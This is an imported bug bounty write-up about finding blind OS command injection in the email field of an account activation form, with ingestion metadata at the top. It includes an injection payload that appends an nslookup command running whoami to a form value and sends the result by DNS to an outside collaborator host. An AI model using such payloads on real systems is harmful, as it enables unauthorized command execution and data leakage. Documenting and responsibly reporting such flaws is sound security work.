---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-05-18_blind-os-command-injection-via-activation-request_2.md
original_filename: 2023-05-18_blind-os-command-injection-via-activation-request_2.md
title: Blind OS Command Injection via Activation Request
category: documents
detected_topics:
- command-injection
- xss
tags:
- imported
- documents
- command-injection
- xss
language: en
raw_sha256: 2ce3bebad2bfd86aa061ada0067f239f89783763973f527f9934bb8d2d2c24d8
text_sha256: 12dd616dcefbe4cdf82a50759e0f77b639c6733e75adcbe217e8553a579b6344
ingested_at: '2026-06-28T07:32:21Z'
sensitivity: unknown
redactions_applied: false
---

# Blind OS Command Injection via Activation Request

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-05-18_blind-os-command-injection-via-activation-request_2.md
- Source Type: markdown
- Detected Topics: command-injection, xss
- Ingested At: 2026-06-28T07:32:21Z
- Redactions Applied: False
- Raw SHA256: `2ce3bebad2bfd86aa061ada0067f239f89783763973f527f9934bb8d2d2c24d8`
- Text SHA256: `12dd616dcefbe4cdf82a50759e0f77b639c6733e75adcbe217e8553a579b6344`


## Content

---
title: "Blind OS Command Injection via Activation Request"
url: "https://medium.com/@alb-soul/blind-os-command-injection-via-activation-request-66dc25377bf4"
authors: ["Arumusutakimu (@arumusutakimu)"]
bugs: ["OS command injection"]
publication_date: "2023-05-18"
added_date: "2023-05-22"
source: "pentester.land/writeups.json"
original_index: 1138
scraped_via: "browseros"
---

# Blind OS Command Injection via Activation Request

Blind OS Command Injection via Activation Request
Arumusutakimu
Follow
3 min read
·
May 18, 2023

67

2

Hello everyone, in this article I’m going to share with you how I found Blind OS Command Injection vulnerability via account activation request.

Firstly, what is blind os command injection?

Press enter or click to view image in full size

OS Command Injection is a web security vulnerability that allows an attacker to execute operating system (OS) command to the server. Indicated with response of request while injected with OS command like ping, echo, etc. Blind OS command injection is where the site is vulnerable but it doesn’t show us the response if target vulnerable. But still can detected with burp collaborator or a listener.

In my case, the vulnerability occurs in email and phone number fields of account activation request’s form when our trial account was expired.

Get Arumusutakimu’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

PoC :

After login with expired account, I can’t access dashboard, instead the pop up alert with Email and Phone Number fields exists for buying their services.
Press enter or click to view image in full size
Pop op that occurs for account activation request if our trial expired
Then I fill the email and phone number, then click Contact Me button to send activation request
In Burpsuite, I sent request history to the Repeater, like below
Press enter or click to view image in full size
HTTP request for account activation
I’ve tried to inject os command like ping -c 10 127.0.0.1 to notice if response has time delay, but it’s not. Then I inject in emailAdrress value with this payload : mymail@mail.com & nslookup burpcollaborator_site_payload, burp collaborator site payload can generated with Right Click -> Insert Collaborator Payload, so it will looks like this :

“emailAddress”:”mymail@mail.com & nslookup `whoami`.BURP-COLLABORATOR-SUBDOMAIN &

Press enter or click to view image in full size
after sent with payload
After sent the payload, nothing in the response indicates if it vulnerable, but go to Collaborator tab and click Poll now button, the payload was triggered
Press enter or click to view image in full size
Payload nslookup was triggered
** FYI : The target has bug bounty program but not in platform like Hackerone. I’ve reported it but until now I didn’t get response yet for 1 month. In their bug bounty policy page written that they will review a report for at least 3 weeks. Tried contact them but no answer. Previously I’ve reported XSS issue they responded but I got duplicate. :D , I can’t publish the target for now ***
Update : They was responded my report, but unfortunately this finding is duplicate
